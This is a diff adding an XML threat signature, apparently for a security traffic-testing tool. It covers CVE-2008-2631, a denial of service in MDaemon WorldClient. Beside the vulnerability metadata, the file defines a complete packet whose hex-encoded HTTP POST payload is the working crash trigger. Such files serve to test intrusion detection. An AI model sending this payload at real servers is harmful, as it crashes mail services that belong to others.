@@ -1,0 +1,76 @@
+<?xml version="1.0" encoding="utf-8"?>
+<threatSignature>
+  <ThreatProperties>
+    <ExecDesc display="true" value="Alt-N MDaemon WorldClient Service Memory Corruption"/>
+    <EngDesc display="true" value="A memory corruption vulnerability exists in Alt-N Technologies MDaemon WorldClient. The vulnerability is due to a NULL pointer dereference in processing a malicious HTTP POST request. A remote unauthenticated attacker can exploit this vulnerability by sending a specially crafted request to the target server, causing the server to crash thereby resulting in a denial of service."/>
+    <Intent display="true">
+      <item value="MEMORY_CORRUPTION"/>
+    </Intent>
+    <Protocol display="true" value="HBCI"/>
+    <Type_Of_Equipment display="true">
+      <item value="Application"/>
+    </Type_Of_Equipment>
+    <Known_Vendors_Affected display="true">
+      <item value="Alt-N_Technologies"/>
+    </Known_Vendors_Affected>
+    <Known_Products_Affected display="true">
+      <item value="Alt-N_Technologies_Alt-N_Technologies_MDaemon"/>
+    </Known_Products_Affected>
+    <Known_Versions_Affected display="true"/>
+    <Credit display="true" value="FSC20080603-04"/>
+    <CVEID display="true" value="CVE-2008-2631"/>
+    <bugtraqID display="true" value=""/>
+    <OSVDB display="true" value=""/>
+    <Author display="true" value="ThreatEx Team"/>
+    <ID display="true" value="23699a9c216699a2e3b63e9fc606d416"/>
+    <Revision display="true" value="1"/>
+    <Safe display="true" value="true"/>
+    <ServerSideAttack display="true" value=""/>
+    <SoftwareRevision display="true" value="2.0"/>
+    <Suite display="true" value="Standard"/>
+    <RunOnce display="false" value="false"/>
+    <Valid_Traffic display="false" value="True"/>
+    <AccessVector display="false" value="remote"/>
+    <AccessComplexity display="false" value="low"/>
+    <Authentication display="false" value="not-required"/>
+    <ConfImpact display="false" value="not-required"/>
+    <IntegImpact display="false" value="not-required"/>
+    <AvailImpact display="false" value="Partial"/>
+    <ImpactBias display="false" value="normal"/>
+    <FirstAdded display="false" value="normal"/>
+    <LastModified display="false" value="633602762367812500"/>
+    <SigStyle display="false" value=""/>
+    <targetNode display="false" value="B"/>
+    <SigProtocol display="false" value=""/>
+    <Rate display="false" value="1"/>
+    <Regex display="false" value=""/>
+    <Created value="1216834772" display="true"/>
+  </ThreatProperties>
+  <Variables>
+    <NamedVar name="sourceMAC" type="ImperfectControls.MacAddress" value="null" index="I"/>
+    <NamedVar name="destMAC" type="ImperfectControls.MacAddress" value="null" index="J"/>
+    <NamedVar name="sourceIP" type="ImperfectControls.IPv4Address" value="null" index="K"/>
+    <NamedVar name="destIP" type="ImperfectControls.IPv4Address" value="null" index="L"/>
+    <NamedVar name="HBCIdestPort" type="ImperfectControls.Port" value="null" index="B"/>
+  </Variables>
+  <Loops>
+    <for index="D">
+      <for index="I"/>
+      <for index="J"/>
+      <for index="K"/>
+      <for index="L"/>
+      <for index="B"/>
+    </for>
+  </Loops>
+  <PostScript/>
+  <Output index="D" Count="">
+    <Ethernet srcMac="$sourceMAC" destMac="$destMAC" pktType="0800">
+      <IP Version="04" InternetHeaderLength="05" TypeofService="00" TotalLength="00FC" Identification="BE2C" FragmentOffset="0000" TTL="40" Protocol="06" HeaderChecksum="1A44" srcIP="$sourceIP" destIP="$destIP" options="" CE="false" DF="true" MF="false">
+        <TCP srcPort="@random(1026,65535)" destPort="$HBCIdestPort" SeqNumber="6438BC48" AckNumber="17E3F431" HeaderLength="08" WindowSize="002E" Checksum="9D90" UrgentPointer="0000" Options="0101080A856A027100000000" Payload="504F5354202F576F726C64436C69656E742E646C6C3F53657373696F6E3D26566965773D436F6D706F736520485454502F312E310D0A486F73743A203137322E31362E382E3130353A333030300D0A436F6E74656E742D547970653A206170706C69636174696F6E2F782D7777772D666F726D2D75726C656E636F6465640D0A436F6E74656E742D4C656E6774683A2034380D0A0D0A436F6D706F7365557365723D416E79696E76616C69645573657225343077686174657665722E636F6D26426F64793D410D0A" CWR="false" ECE="false" URG="false" ACK="true" PSH="true" RST="false" SYN="false" FIN="false" RES1="false" RES2="false" RES3="false" RES4="false"/>
+      </IP>
+    </Ethernet>
+  </Output>
+  <Input>
+    <Ethernet/>
+  </Input>
+</threatSignature>
